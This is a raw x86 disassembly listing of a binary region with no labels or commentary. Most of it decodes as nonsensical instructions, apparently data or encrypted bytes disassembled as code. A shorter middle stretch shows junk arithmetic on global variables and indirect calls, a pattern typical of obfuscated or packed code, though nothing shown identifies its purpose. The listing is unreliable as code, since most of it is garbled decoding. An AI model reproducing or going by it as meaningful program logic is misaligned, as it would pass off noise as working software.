  41244e:	sbb    BYTE PTR [esp+edi*2],0x24
  412452:	adc    BYTE PTR [esi-0x39ba77a3],0xfe
  412459:	pop    edx
  41245a:	add    al,0x84
  41245c:	loop   0x4123ed
  41245e:	xor    al,0xc1
  412460:	outs   dx,BYTE PTR ds:[esi]
  412461:	xchg   BYTE PTR [esi-0x73],ch
  412464:	sub    BYTE PTR [esi],dh
  412466:	mov    ds:0x16859dd9,eax
  41246b:	and    ebp,ebx
  41246d:	icebp  
  41246e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41246f:	shl    DWORD PTR [ebx-0x4193243],0xfe
  412476:	xor    al,0x70
  412478:	dec    BYTE PTR [esp+edi*1]
  41247b:	xor    BYTE PTR [ecx+0x79],ah
  41247e:	adc    eax,0xeb6c8f22
  412483:	je     0x4124a4
  412485:	sub    esp,0x6f6dcac3
  41248b:	or     al,0xba
  41248d:	in     al,0xe4
  41248f:	dec    esi
  412490:	outs   dx,BYTE PTR ds:[esi]
  412491:	or     edx,eax
  412493:	mov    eax,DWORD PTR [edi+edi*8-0x7530f085]
  41249a:	std    
  41249b:	adc    BYTE PTR [ebx+0x53709b5c],bl
  4124a1:	addr16 into 
  4124a3:	adc    al,0x9d
  4124a5:	std    
  4124a6:	push   cs
  4124a7:	test   al,0xc2
  4124a9:	lea    esi,[eax]
  4124ab:	adc    al,0x8f
  4124ad:	xor    eax,0xcbbd4a27
  4124b2:	cs mov edx,0xb7f76c65
  4124b8:	or     DWORD PTR ds:0x78471f0b,0x42477ac4
  4124c2:	xchg   esi,eax
  4124c3:	aaa    
  4124c4:	sti    
  4124c5:	cdq    
  4124c6:	xchg   ebp,eax
  4124c7:	shr    DWORD PTR [edx],cl
  4124c9:	(bad)  [edx]
  4124cb:	fsub   DWORD PTR [ebx*8+0x22b95c81]
  4124d2:	sub    BYTE PTR [ebx],dh
  4124d4:	pushf  
  4124d5:	and    BYTE PTR [edx],bl
  4124d7:	shl    DWORD PTR ds:0x9490066d,1
  4124dd:	push   ecx
  4124de:	push   edi
  4124df:	adc    DWORD PTR [ecx-0x24726a8b],esp
  4124e5:	xlat   BYTE PTR ds:[ebx]
  4124e6:	cmp    ebp,DWORD PTR [ebp-0x5c]
  4124e9:	push   edx
  4124ea:	test   DWORD PTR [esi+0x20a9febe],0x573171cd
  4124f4:	cdq    
  4124f5:	pop    es
  4124f6:	inc    ebx
  4124f7:	push   ebx
  4124f8:	neg    DWORD PTR [eax+0x72]
  4124fb:	sbb    eax,esi
  4124fd:	adc    esi,DWORD PTR [esi+0x4b]
  412500:	fs cmp bh,0x2f
  412504:	fmul   QWORD PTR [edi]
  412506:	leave  
  412507:	iret   
  412508:	out    0x60,eax
  41250a:	daa    
  41250b:	mov    ah,0x7f
  41250d:	jge    0x4124c9
  41250f:	add    al,0x18
  412511:	adc    eax,0x6ca87cce
  412516:	xchg   edi,eax
  412517:	enter  0x5742,0x48
  41251b:	mov    edi,0x46f4e309
  412520:	leave  
  412521:	push   esi
  412522:	xchg   edi,eax
  412523:	stc    
  412524:	pop    esp
  412525:	aaa    
  412526:	(bad)  
  412527:	cmp    eax,0x767357e2
  41252c:	ds pop ds
  41252e:	ja     0x4124e0
  412530:	and    al,0x9b
  412532:	adc    eax,DWORD PTR [eax-0x42c6e914]
  412538:	push   edi
  412539:	ret    
  41253a:	xor    al,0x2c
  41253c:	cdq    
  41253d:	test   ebx,0x707c9c4d
  412543:	mov    ss,WORD PTR [ecx-0x62d9ea6e]
  412549:	sub    ch,bh
  41254b:	mov    ebx,0xcaee218c
  412550:	aas    
  412551:	repz loop 0x412567
  412554:	xchg   ebx,eax
  412555:	and    al,0x47
  412557:	push   eax
  412558:	fild   QWORD PTR [esi+0x4d]
  41255b:	icebp  
  41255c:	cmp    eax,0x15e80d5e
  412561:	add    ecx,eax
  412563:	xchg   esi,esi
  412565:	fiadd  DWORD PTR [ebp+0x61]
  412568:	push   edi
  412569:	mov    ecx,edi
  41256b:	nop
  41256c:	dec    ebx
  41256d:	xor    al,BYTE PTR [ecx-0x3a6b1046]
  412573:	retf   0x9ad0
  412576:	fmul   DWORD PTR [edx+0xc]
  412579:	mov    cl,0x58
  41257b:	ja     0x4124fd
  41257d:	ins    BYTE PTR es:[edi],dx
  41257e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41257f:	js     0x412540
  412581:	int3   
  412582:	inc    ecx
  412583:	lds    ecx,FWORD PTR [ecx+edi*2]
  412586:	pop    edi
  412587:	mov    esp,0xa6a4ab
  41258c:	shl    edx,0xda
  41258f:	adc    ebx,DWORD PTR [ecx+0x3f4bf82f]
  412595:	enter  0x361d,0x8b
  412599:	pushf  
  41259a:	and    esi,DWORD PTR [edx-0x53]
  41259d:	ret    0x3076
  4125a0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4125a1:	dec    ebx
  4125a2:	imul   ebx,DWORD PTR [ebx-0x7e0fe695],0xffffff93
  4125a9:	xor    BYTE PTR [ecx],cl
  4125ab:	test   BYTE PTR [esi+0x25],0x4b
  4125af:	es and al,0xd6
  4125b2:	pop    ecx
  4125b3:	lahf   
  4125b4:	ret    0x62ee
  4125b7:	sbb    DWORD PTR [ebx-0x6b],0x7b6e4faa
  4125be:	jl     0x41259b
  4125c0:	imul   ebx,DWORD PTR [ebx],0xffffffd2
  4125c3:	add    DWORD PTR [edi],edi
  4125c5:	scas   al,BYTE PTR es:[edi]
  4125c6:	dec    ebp
  4125c7:	mov    edi,0x7e36deff
  4125cc:	mov    WORD PTR [edx+0xa],ds
  4125cf:	pop    edi
  4125d0:	and    BYTE PTR [edi],ah
  4125d2:	fcomp  DWORD PTR [esi]
  4125d4:	jnp    0x4125df
  4125d6:	mov    ah,0x5e
  4125d8:	mov    bh,0x9f
  4125da:	stos   DWORD PTR es:[edi],eax
  4125db:	ja     0x412627
  4125dd:	xor    DWORD PTR [edx+0x61fa2fc],esi
  4125e3:	mov    edi,0x190ef0ee
  4125e8:	mov    ch,0x37
  4125ea:	scas   eax,DWORD PTR es:[edi]
  4125eb:	mov    ebx,0x890e99e5
  4125f0:	ficom  WORD PTR [edx+0x659b5ce3]
  4125f6:	inc    ebp
  4125f7:	gs dec edi
  4125f9:	and    BYTE PTR [ebx],0xe5
  4125fc:	sbb    al,0xf0
  4125fe:	adc    bl,BYTE PTR [ecx*8-0x59d9a741]
  412605:	mov    edx,0x98e1be1d
  41260a:	addr16 dec eax
  41260c:	push   ss
  41260d:	push   ebp
  41260e:	jb     0x4125f9
  412610:	jno    0x41265f
  412612:	sub    dl,BYTE PTR [esi]
  412614:	or     eax,0xe8c9adcf
  412619:	and    al,0x73
  41261b:	jl     0x412672
  41261d:	pop    es
  41261e:	outs   dx,BYTE PTR ds:[esi]
  41261f:	pop    esp
  412620:	ja     0x412614
  412622:	sahf   
  412623:	gs mov al,0x20
  412626:	and    bl,0xcc
  412629:	aas    
  41262a:	push   ebp
  41262b:	into   
  41262c:	cmp    al,0xbf
  41262e:	call   0x8829d8f3
  412633:	mov    al,ds:0x6090e757
  412638:	or     al,ch
  41263a:	aas    
  41263b:	lds    ebp,FWORD PTR [ebp+0x3736d7e3]
  412641:	sub    DWORD PTR [ecx],ebx
  412643:	add    eax,0x7017aaba
  412648:	add    edx,DWORD PTR [eax]
  41264a:	push   es
  41264b:	in     eax,dx
  41264c:	jbe    0x412649
  41264e:	les    eax,FWORD PTR [ebx-0x70]
  412651:	pop    esi
  412652:	lods   al,BYTE PTR ds:[esi]
  412653:	fsub   st,st(1)
  412655:	cli    
  412656:	and    al,0x9
  412658:	inc    edx
  412659:	in     al,dx
  41265a:	into   
  41265b:	push   ebp
  41265c:	adc    BYTE PTR [esi-0x39],bh
  41265f:	ror    BYTE PTR [eax-0x12a4ad3f],0x5b
  412666:	add    esi,DWORD PTR [edi+0x78]
  412669:	xchg   esp,eax
  41266a:	shr    DWORD PTR [eax+0x57],0x3d
  41266e:	stc    
  41266f:	imul   ecx,DWORD PTR [ebp-0x4b],0xc7e7998b
  412676:	rol    BYTE PTR [ecx-0x32ad3d97],1
  41267c:	jne    0x41264f
  41267e:	push   eax
  41267f:	jmp    0x24505acb
  412684:	or     al,0x7c
  412686:	sahf   
  412687:	shr    DWORD PTR [esp+edx*2-0x53],0xb
  41268c:	push   esi
  41268d:	push   edi
  41268e:	xor    DWORD PTR ds:0x428575,edx
  412694:	mov    eax,DWORD PTR [ebp+0x8]
  412697:	add    ebx,DWORD PTR ds:0x428371
  41269d:	mov    ecx,DWORD PTR [ebp+0xc]
  4126a0:	and    ebx,DWORD PTR ds:0x428569
  4126a6:	shrd   eax,ecx,0x2
  4126aa:	xor    esi,DWORD PTR ds:0x428585
  4126b0:	shr    ecx,0x2
  4126b3:	mov    ecx,DWORD PTR [ebp+0x8]
  4126b6:	cmp    DWORD PTR ds:0x4284ed,0x0
  4126bd:	not    ebx
  4126bf:	mov    edi,0x75d4
  4126c4:	mov    DWORD PTR ds:0x42857d,0x68f
  4126ce:	mov    DWORD PTR ds:0x428589,0x72ee
  4126d8:	jmp    0x412740
  4126dd:	mov    esi,DWORD PTR ds:0x428439
  4126e3:	mov    DWORD PTR ds:0x428389,0x6012
  4126ed:	cmp    DWORD PTR ds:0x4284ed,0x0
  4126f4:	jg     0x41272a
  4126fa:	push   0x1b53
  4126ff:	push   0x62ef
  412704:	call   DWORD PTR ds:0x42e008
  41270a:	and    edi,0x6509
  412710:	xor    edx,edx
  412712:	add    edx,DWORD PTR ds:0x428581
  412718:	and    edx,DWORD PTR ds:0x428521
  41271e:	mov    DWORD PTR ds:0x428581,edx
  412724:	and    edi,DWORD PTR ds:0x428371
  41272a:	adc    DWORD PTR ds:0x428359,edi
  412730:	add    DWORD PTR ds:0x428591,edi
  412736:	mov    DWORD PTR ds:0x428489,0x7a33
  412740:	mov    edx,DWORD PTR [ebp+0xc]
  412743:	cmp    DWORD PTR ds:0x428469,0x0
  41274a:	mov    DWORD PTR ds:0x428351,0x5b58
  412754:	not    ebx
  412756:	mov    DWORD PTR ds:0x42847d,0x50a2
  412760:	mov    DWORD PTR ds:0x428451,edx
  412766:	jmp    0x4127b4
  41276b:	mov    DWORD PTR ds:0x428589,0x3c96
  412775:	cmp    DWORD PTR ds:0x428469,0x0
  41277c:	jne    0x41279e
  412782:	push   0x4282d5
  412787:	push   DWORD PTR [ebp-0x1c]
  41278a:	call   DWORD PTR ds:0x42e0cc
  412790:	and    DWORD PTR ds:0x428451,edi
  412796:	neg    DWORD PTR ds:0x428365
  41279c:	not    edi
  41279e:	sbb    DWORD PTR ds:0x42838d,edx
  4127a4:	sub    edi,ebx
  4127a6:	or     DWORD PTR ds:0x428469,ebx
  4127ac:	xor    esi,esi
  4127ae:	or     DWORD PTR ds:0x428355,ecx
  4127b4:	xor    edx,edx
  4127b6:	mov    esi,0x32de6d5d
  4127bb:	sub    DWORD PTR ds:0x42837d,ecx
  4127c1:	xor    eax,esi
  4127c3:	or     eax,edx
  4127c5:	mov    DWORD PTR [ebp-0x34],eax
  4127c8:	cmp    DWORD PTR ds:0x428469,0x0
  4127cf:	not    ebx
  4127d1:	mov    edx,0x6453
  4127d6:	mov    ebx,DWORD PTR ds:0x42848d
  4127dc:	mov    edi,DWORD PTR ds:0x42837d
  4127e2:	jmp    0x412823
  4127e7:	mov    edi,0x4ae9
  4127ec:	cmp    DWORD PTR ds:0x428469,0x0
  4127f3:	jbe    0x41280b
  4127f9:	push   0x428389
  4127fe:	call   DWORD PTR ds:0x42e254
  412804:	and    ebx,DWORD PTR ds:0x428445
  41280a:	inc    edx
  41280b:	adc    edx,0x18bc
  412811:	mov    ebx,DWORD PTR ds:0x428509
  412817:	or     ebx,DWORD PTR ds:0x428461
  41281d:	mov    DWORD PTR ds:0x428509,ebx
  412823:	mov    eax,DWORD PTR [ebp+0x8]
  412826:	shl    ecx,0x1e
  412829:	mov    ecx,DWORD PTR [ebp+0xc]
  41282c:	shrd   eax,ecx,0x2
  412830:	xor    eax,esi
  412832:	add    DWORD PTR ds:0x428459,0x71c1
  41283c:	shr    ecx,0x2
  41283f:	cmp    DWORD PTR ds:0x428519,0x0
  412846:	mov    DWORD PTR ds:0x428441,0x17f6
  412850:	mov    DWORD PTR ds:0x428445,ecx
  412856:	jmp    0x41291d
  41285b:	movzx  ecx,WORD PTR ds:0x4284fd
  412862:	cmp    DWORD PTR ds:0x428519,0x0
  412869:	jl     0x412892
  41286f:	push   DWORD PTR [ebp-0x10]
  412872:	call   DWORD PTR ds:0x42e0d0
  412878:	sub    DWORD PTR ds:0x42843d,edi
  41287e:	xor    edx,edx
  412880:	or     edx,DWORD PTR ds:0x4283e5
  412886:	mov    edi,DWORD PTR ds:0x428545
  41288c:	sub    edx,edi
  41288e:	sub    edx,DWORD PTR [edx+edi*1]
  412891:	inc    edx
  412892:	inc    edx
  412893:	or     DWORD PTR ds:0x4284e5,0x781a
  41289d:	adc    edi,DWORD PTR ds:0x428575
  4128a3:	sbb    ebx,DWORD PTR ds:0x428585
  4128a9:	cmp    DWORD PTR ds:0x428489,0x0
  4128b0:	mov    DWORD PTR ds:0x428515,0x3519
  4128ba:	mov    DWORD PTR ds:0x42858d,edx
  4128c0:	jmp    0x41291d
  4128c5:	mov    edi,DWORD PTR ds:0x428465
  4128cb:	mov    DWORD PTR ds:0x428381,0x6a8c
  4128d5:	cmp    DWORD PTR ds:0x428489,0x0
  4128dc:	jae    0x412909
  4128e2:	push   0x74d4
  4128e7:	push   DWORD PTR [ebp-0x24]
  4128ea:	call   DWORD PTR ds:0x42e00c
  4128f0:	xor    ecx,ecx
  4128f2:	or     ecx,DWORD PTR ds:0x4284d1
  4128f8:	mov    edi,DWORD PTR ds:0x4285dd
  4128fe:	sub    ecx,edi
  412900:	add    ecx,DWORD PTR [ecx+edi*1]
  412903:	xor    DWORD PTR ds:0x428569,ebx
  412909:	add    DWORD PTR ds:0x42857d,edx
  41290f:	sub    edi,DWORD PTR ds:0x428519
  412915:	neg    edx
  412917:	sub    ecx,DWORD PTR ds:0x428579
  41291d:	mov    ecx,DWORD PTR [ebp+0x8]
  412920:	cmp    DWORD PTR ds:0x428581,0x0
  412927:	movzx  edx,BYTE PTR ds:0x428431
  41292e:	mov    edi,DWORD PTR ds:0x428471
  412934:	jmp    0x41298c
  412939:	mov    DWORD PTR ds:0x42850d,0x3a54
  412943:	mov    DWORD PTR ds:0x428365,0x35a1
  41294d:	cmp    DWORD PTR ds:0x428581,0x0
  412954:	jbe    0x412981
  41295a:	push   0x731e
  41295f:	push   DWORD PTR [ebp-0x1c]
  412962:	push   0x5d33
  412967:	push   DWORD PTR [ebp-0x28]
  41296a:	push   DWORD PTR [ebp-0x20]
  41296d:	call   DWORD PTR ds:0x42e0d4
  412973:	and    edx,edi
  412975:	and    DWORD PTR ds:0x428505,ebx
  41297b:	sbb    edi,0x47ca
  412981:	inc    edx
  412982:	add    DWORD PTR ds:0x428365,0x615e
  41298c:	mov    edx,DWORD PTR [ebp+0xc]
  41298f:	xor    ebx,ebx
  412991:	add    ebx,DWORD PTR ds:0x4283b1
  412997:	mov    edi,DWORD PTR ds:0x4285ad
  41299d:	sub    edi,ebx
  41299f:	or     ebx,DWORD PTR [ebx+edi*1]
  4129a2:	xor    edx,edx
  4129a4:	xor    DWORD PTR ds:0x428489,ebx
  4129aa:	or     eax,edx
  4129ac:	adc    edx,0x4918
  4129b2:	mov    DWORD PTR [ebp-0x34],eax
  4129b5:	sub    ebx,edx
  4129b7:	mov    eax,ds:0x4225a8
  4129bc:	mov    eax,DWORD PTR [eax]
  4129be:	mov    DWORD PTR [ebp-0x28],eax
  4129c1:	mov    eax,ds:0x4227c8
  4129c6:	mov    eax,DWORD PTR [eax]
  4129c8:	xor    edx,edx
  4129ca:	mov    DWORD PTR [ebp-0x20],eax
  4129cd:	mov    ebx,DWORD PTR ds:0x4284bd
  4129d3:	mov    ebx,DWORD PTR [ebx]
  4129d5:	sub    DWORD PTR ds:0x4284fd,ebx
  4129db:	mov    eax,DWORD PTR [ebp-0x28]
  4129de:	mov    eax,DWORD PTR [ebp-0x28]
  4129e1:	xor    edx,edx
  4129e3:	mov    ebx,DWORD PTR [ebp+0x8]
  4129e6:	movzx  edx,BYTE PTR ds:0x4284f5
  4129ed:	sbb    DWORD PTR ds:0x428381,edx
  4129f3:	shl    ecx,0x1e
  4129f6:	mov    edi,DWORD PTR ds:0x42835d
  4129fc:	adc    DWORD PTR ds:0x428395,edi
  412a02:	xor    ecx,ecx
  412a04:	and    DWORD PTR ds:0x428355,ecx
  412a0a:	shld   ecx,eax,0x2
  412a0e:	jmp    0x412d47
  412a13:	scas   eax,DWORD PTR es:[edi]
  412a14:	cdq    
  412a15:	and    esp,ecx
  412a17:	sub    edi,DWORD PTR [eax+esi*4-0x64]
  412a1b:	push   ecx
  412a1c:	mov    edx,0x141090d1
  412a21:	js     0x4129b5
  412a23:	pop    esp
  412a24:	jb     0x4129e4
  412a26:	mov    esi,0xbebec4ed
  412a2b:	rcr    BYTE PTR [edi],1
  412a2d:	popf   
  412a2e:	fidiv  DWORD PTR [ebx-0x68e4eccb]
  412a34:	push   es
  412a35:	cdq    
  412a36:	and    dl,BYTE PTR [edi+0x59]
  412a39:	push   cs
  412a3a:	add    esi,DWORD PTR [ebx+0x16]
  412a3d:	les    ebx,FWORD PTR [ebx+0x3b]
  412a40:	mov    bh,0x1b
  412a42:	int    0xf0
  412a44:	or     bl,cl
  412a46:	je     0x412a97
  412a48:	push   edi
  412a49:	es scas al,BYTE PTR es:[edi]
  412a4b:	cmp    BYTE PTR [edi-0x34c253df],ch
  412a51:	mov    al,ds:0x355f34be
  412a56:	enter  0x5aaf,0x96
  412a5a:	fwait
  412a5b:	xlat   BYTE PTR ds:[ebx]
  412a5c:	mov    ah,0x75
  412a5e:	mov    ds:0x7f8e8fc3,eax
  412a63:	jecxz  0x412a0f
  412a65:	imul   ebx,eax,0xffffffb9
  412a68:	cld    
  412a69:	add    eax,0xa3ee6410
  412a6e:	jo     0x412a85
  412a70:	cmp    dh,BYTE PTR [edi+0x55c5ea1f]
  412a76:	mov    ebp,0x75a279ba
  412a7b:	xor    ch,ah
  412a7d:	xchg   edx,eax
  412a7e:	aas    
  412a7f:	shr    BYTE PTR [ecx+0x5a82d254],0x2a
  412a86:	stos   DWORD PTR es:[edi],eax
  412a87:	pusha  
  412a88:	xor    ebp,DWORD PTR [edi+0x7]
  412a8b:	mov    edi,0x572c086e
  412a90:	mov    WORD PTR [edx+0x666ed9ad],cs
  412a96:	aas    
  412a97:	and    ah,dh
  412a99:	scas   eax,DWORD PTR es:[edi]
  412a9a:	addr16 mov ebx,0xcbd7a9a
  412aa0:	das    
  412aa1:	or     DWORD PTR [edx+0x67489e3f],edx
  412aa7:	or     DWORD PTR [ebx-0x3f6d2fa9],0x15
  412aae:	xchg   ebx,eax
  412aaf:	fs mov esp,0x3fbc6c31
  412ab5:	and    bl,BYTE PTR [edi+0x2970ec89]
  412abb:	xchg   DWORD PTR [ebp-0x18aaf2a5],edi
  412ac1:	stc    
  412ac2:	dec    edi
  412ac3:	inc    eax
  412ac4:	push   es
  412ac5:	cmp    DWORD PTR [eax],ecx
  412ac7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412ac8:	jmp    0x821fa360
  412acd:	push   ss
  412ace:	js     0x412b46
  412ad0:	iret   
  412ad1:	mov    bl,0xf4
  412ad3:	mov    bh,0x7e
  412ad5:	clc    
  412ad6:	hlt    
  412ad7:	into   
  412ad8:	push   esp
  412ad9:	aaa    
  412ada:	sbb    BYTE PTR [esi+0x4d45d8ac],0x64
  412ae1:	add    al,0x9c
  412ae3:	les    ebp,FWORD PTR [ecx]
  412ae5:	ja     0x412a93
  412ae7:	xchg   edx,eax
  412ae8:	xchg   edi,eax
  412ae9:	xor    BYTE PTR [ebx],ch
  412aeb:	fcmovnbe st,st(0)
  412aed:	pop    ecx
  412aee:	scas   eax,DWORD PTR es:[edi]
  412aef:	loop   0x412ace
  412af1:	fcomp  QWORD PTR [edx]
  412af3:	dec    ebx
  412af4:	lock pop esp
  412af6:	sub    DWORD PTR [ebp-0x7d],0xbc680e11
  412afd:	sahf   
  412afe:	mov    bl,BYTE PTR [ecx]
  412b00:	adc    cl,al
  412b02:	loop   0x412aad
  412b04:	shr    bh,cl
  412b06:	mov    al,0xe6
  412b08:	in     al,0xb8
  412b0a:	dec    esi
  412b0b:	mov    al,ds:0x21a53c20
  412b10:	repnz sub BYTE PTR [ebx+0xe],0x6e
  412b15:	and    al,0x92
  412b17:	mov    esi,0xd382310c
  412b1c:	cmp    DWORD PTR [esi],0xb
  412b1f:	scas   eax,DWORD PTR es:[edi]
  412b20:	inc    esi
  412b21:	fs in  al,dx
  412b23:	push   ecx
  412b24:	mov    edi,DWORD PTR [ecx-0x46]
  412b27:	(bad)  
  412b28:	lds    edi,FWORD PTR [edx+0x1fa7a901]
  412b2e:	jbe    0x412ae1
  412b30:	jecxz  0x412b4f
  412b32:	lods   eax,DWORD PTR ds:[esi]
  412b33:	daa    
  412b34:	dec    ebx
  412b35:	into   
  412b36:	mov    esp,DWORD PTR [edx+0x35]
  412b39:	jp     0x412ba0
  412b3b:	sbb    al,0x9f
  412b3d:	data16 fist DWORD PTR [edx+0x3111326e]
  412b44:	jp     0x412b78
  412b46:	sub    DWORD PTR [ecx+0x77],esp
  412b49:	push   ds
  412b4a:	mov    cl,0xb7
  412b4c:	icebp  
  412b4d:	lock mov dl,0x6c
  412b50:	sbb    ah,ah
  412b52:	add    al,0x64
  412b54:	jmp    0x9045:0xdd6950ba
  412b5b:	mov    bl,0x5a
  412b5d:	data16 loopne 0x412bcf
  412b60:	ins    BYTE PTR es:[edi],dx
  412b61:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412b62:	mov    eax,ds:0xf50a05e1
  412b67:	jns    0x412b1a
  412b69:	push   ss
  412b6a:	push   edx
  412b6b:	in     eax,dx
  412b6c:	push   ecx
  412b6d:	sar    BYTE PTR [ecx+0x3aaf79d3],cl
  412b73:	inc    esp
  412b74:	and    al,0xef
  412b76:	cmp    BYTE PTR [esi-0x2cd511f7],bh
  412b7c:	adc    eax,0x48751d1
  412b81:	mov    dh,0x13
  412b83:	mov    BYTE PTR [eax-0x48b5c074],al
  412b89:	addr16 fwait
  412b8b:	dec    esi
  412b8c:	aam    0xc9
  412b8e:	xchg   esp,eax
  412b8f:	pop    esp
  412b90:	pop    ds
  412b91:	imul   edx,DWORD PTR [eax],0xa7827d59
  412b97:	bound  esi,QWORD PTR [edi+0x38]
  412b9a:	add    BYTE PTR [bp+0x64],dl
  412b9e:	jae    0x412bcd
  412ba0:	jmp    0x8753466
  412ba5:	scas   eax,DWORD PTR es:[edi]
  412ba6:	jle    0x412bd3
  412ba8:	mov    cl,0x28
  412baa:	iret   
  412bab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412bac:	jo     0x412b6f
  412bae:	retf   0x1957
  412bb1:	lahf   
  412bb2:	out    0x3d,al
  412bb4:	ins    BYTE PTR es:[edi],dx
  412bb5:	mov    ds:0xd61461f1,al
  412bba:	cmp    DWORD PTR [ebp-0x7814dec5],ebx
  412bc0:	outs   dx,BYTE PTR ds:[esi]
  412bc1:	jge    0x412be8
  412bc3:	adc    eax,0x665993d
  412bc8:	fisttp DWORD PTR [esi-0x22]
  412bcb:	mov    dl,0x93
  412bcd:	pop    edx
  412bce:	aad    0x88
  412bd0:	adc    DWORD PTR cs:[eax+0x23],ebx
  412bd4:	dec    esi
  412bd5:	ror    BYTE PTR [ebp+0x62],0x67
  412bd9:	fist   DWORD PTR [eax]
  412bdb:	pop    edx
  412bdc:	jo     0x412c26
  412bde:	inc    ebp
  412bdf:	sbb    DWORD PTR [ebx],edi
  412be1:	adc    dh,al
  412be3:	add    al,0xa5
  412be5:	lods   al,BYTE PTR ds:[esi]
  412be6:	cmp    BYTE PTR [ecx+ecx*4],al
  412be9:	dec    ebx
  412bea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412beb:	sahf   
  412bec:	scas   al,BYTE PTR es:[edi]
  412bed:	(bad)  
  412bee:	jnp    0x412bed
  412bf0:	sub    eax,0x5c2d4906
  412bf5:	clc    
  412bf6:	mov    ah,bh
  412bf8:	in     al,dx
  412bf9:	aad    0xf1
  412bfb:	cmp    dl,bl
  412bfd:	add    BYTE PTR [ecx-0x53fe3734],cl
  412c03:	pop    eax
  412c04:	bound  edx,QWORD PTR [eax+0x48]
  412c07:	mov    ds:0x14a89c6e,al
  412c0c:	adc    esp,DWORD PTR [edi-0x77d71200]
  412c12:	jge    0x412c0d
  412c14:	push   cs
  412c15:	xchg   DWORD PTR [esi-0x3e],edx
  412c18:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412c19:	add    ecx,DWORD PTR [ebp-0x30]
  412c1c:	jp     0x412be6
  412c1e:	push   ss
  412c1f:	je     0x412c9e
  412c21:	das    
  412c22:	pop    ds
  412c23:	push   ebp
  412c24:	or     ebx,edi
  412c26:	push   ds
  412c27:	inc    ebp
  412c28:	dec    eax
  412c29:	cli    
  412c2a:	jecxz  0x412c06
  412c2c:	sahf   
  412c2d:	gs mov edx,0x4d82214e
  412c33:	aas    
  412c34:	mov    cl,0xeb
  412c36:	outs   dx,DWORD PTR ds:[esi]
  412c37:	sub    al,0x39
  412c39:	jbe    0x412c41
  412c3b:	add    eax,0x272ca39d
  412c40:	mov    dh,0x28
  412c42:	add    BYTE PTR [eax-0x7f],dl
  412c45:	enter  0xe87d,0xbf
  412c49:	jae    0x412c7d
  412c4b:	jmp    0x412c68
  412c4d:	cmp    eax,0xebff5e9e
  412c52:	jne    0x412bd8
  412c54:	mov    DWORD PTR [ebp-0x17],0x91b5d29e
  412c5b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412c5c:	fisttp DWORD PTR [edi]
  412c5e:	mov    edx,0x12f12626
  412c63:	test   eax,ebx
  412c65:	mov    ecx,0x896614cc
  412c6a:	cwde   
  412c6b:	cmp    bl,BYTE PTR [ebx-0x32]
  412c6e:	lods   al,BYTE PTR ds:[esi]
  412c6f:	enter  0x1431,0xb5
  412c73:	enter  0x502a,0xdc
  412c77:	pop    ebx
  412c78:	shl    DWORD PTR [edx-0x62],cl
  412c7b:	test   BYTE PTR [edi+0x60fc0d08],ah
  412c81:	jge    0x412ca9
  412c83:	push   esp
  412c84:	and    al,0x3
  412c86:	mov    dh,0x51
  412c88:	fisttp DWORD PTR [esi+0x78]
  412c8b:	mov    WORD PTR [edi],gs
  412c8d:	add    BYTE PTR [esi],ch
  412c8f:	mov    al,0x2e
  412c91:	imul   ebp,ebp,0xd8645531
  412c97:	iret   
  412c98:	test   BYTE PTR [ebp-0x68],cl
  412c9b:	mov    ebx,0x52356ceb
  412ca0:	inc    eax
  412ca1:	(bad)  
  412ca2:	clc    
  412ca3:	xchg   edx,eax
  412ca4:	mov    ds:0xbcd97233,al
  412ca9:	in     eax,0x55
  412cab:	out    dx,eax
  412cac:	fs mov bl,0xfc
  412caf:	das    
  412cb0:	shr    DWORD PTR [ecx],1
  412cb2:	icebp  
  412cb3:	cmp    eax,0xc639a48b
  412cb8:	retf   
  412cb9:	loop   0x412c7c
  412cbb:	sub    BYTE PTR [ebp+0x1b],dl
  412cbe:	pop    edi
  412cbf:	mov    cl,0xfd
  412cc1:	xor    al,0xc5
  412cc3:	xchg   edx,eax
  412cc4:	ror    BYTE PTR [ecx+0x2a],cl
  412cc7:	call   0xa5cd6973
  412ccc:	or     DWORD PTR [ebx+0x4d1b11e2],eax
  412cd2:	cmp    DWORD PTR [edi-0x38],ebx
  412cd5:	not    DWORD PTR [edi]
  412cd7:	push   esp
  412cd8:	clc    
  412cd9:	xchg   edx,eax
  412cda:	ss mov esi,0x4462f64d
  412ce0:	dec    esp
  412ce1:	sar    BYTE PTR [ebx],1
  412ce3:	xor    dl,al
  412ce5:	dec    ebx
  412ce6:	mov    ah,ah
  412ce8:	push   eax
  412ce9:	jb     0x412d3d
  412ceb:	inc    ecx
  412cec:	adc    DWORD PTR [ebx-0x1d],ebx
  412cef:	xchg   cl,al
  412cf1:	ret    
  412cf2:	xchg   edi,eax
  412cf3:	call   0xc81c:0x6a3987f1
  412cfa:	stos   BYTE PTR es:[edi],al
  412cfb:	fwait
  412cfc:	sbb    al,0xe3
  412cfe:	mov    ah,BYTE PTR [ebx]
  412d00:	test   BYTE PTR [ecx],ch
  412d02:	out    0xba,al
  412d04:	xchg   esp,eax
  412d05:	psrlw  mm5,mm6
  412d08:	cmp    DWORD PTR [ecx+0xc],ebx
  412d0b:	aaa    
  412d0c:	outs   dx,BYTE PTR ds:[esi]
  412d0d:	xor    dl,BYTE PTR [ebx]
  412d0f:	sbb    edi,DWORD PTR gs:[esi+0x1c15f599]
  412d16:	into   
  412d17:	out    dx,eax
  412d18:	lea    ebp,[esi-0x45436b26]
  412d1e:	jbe    0x412d30
  412d20:	test   eax,0xaa0b006b
  412d25:	and    bl,0x35
  412d28:	mov    ebx,DWORD PTR [eiz*1+0x64a848ce]
  412d2f:	jle    0x412db0
  412d31:	mov    WORD PTR [ecx+0x46ce5797],es
  412d37:	cld    
  412d38:	sub    bh,bh
  412d3a:	mov    edi,0x8dc00f8c
  412d3f:	xchg   BYTE PTR [esi+ebp*2],bl
  412d42:	jmp    0xf2ec1c8
  412d47:	shl    eax,0x2
  412d4a:	and    edi,edi
  412d4c:	mov    edi,0xcb79b576
  412d51:	mov    edx,0x9c2b8ae8
  412d56:	mov    DWORD PTR [ebp-0x10],ebx
  412d59:	mov    DWORD PTR ds:0x428485,0xc27
